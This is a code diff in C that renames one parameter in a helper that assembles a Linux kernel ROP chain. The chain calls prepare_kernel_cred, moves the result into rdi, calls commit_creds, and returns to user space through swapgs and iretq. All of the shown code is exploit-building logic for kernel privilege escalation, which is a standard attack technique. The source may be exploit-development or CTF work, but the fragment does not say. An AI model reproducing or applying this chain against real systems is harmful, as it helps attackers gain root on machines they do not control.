@@ -24,7 +24,7 @@ size_t append_chain(uintptr_t *dst,
 size_t chain_kcred_iretq(uintptr_t *rop,
                         uintptr_t pop_rdi_ret,
                         uintptr_t prepare_kernel_cred,
-                        const uintptr_t *mov_rax_to_rdi_chain,
+                        const uintptr_t *mov_rdi_rax_chain,
                         uintptr_t commit_creds,
                         uintptr_t swapgs_pop_rbp_ret,
                         uintptr_t iretq,
@@ -38,8 +38,8 @@ size_t chain_kcred_iretq(uintptr_t *rop,
     rop[i++] = prepare_kernel_cred;
 
     // Step 2: rdi ⟵ returned rax (chain assumed to include dummies)
-    for (size_t j = 0; mov_rax_to_rdi_chain[j]; ++j) {
-        rop[i++] = mov_rax_to_rdi_chain[j];
+    for (size_t j = 0; mov_rdi_rax_chain[j]; ++j) {
+        rop[i++] = mov_rdi_rax_chain[j];
     }
 
     // Step 3: commit_creds(rdi)
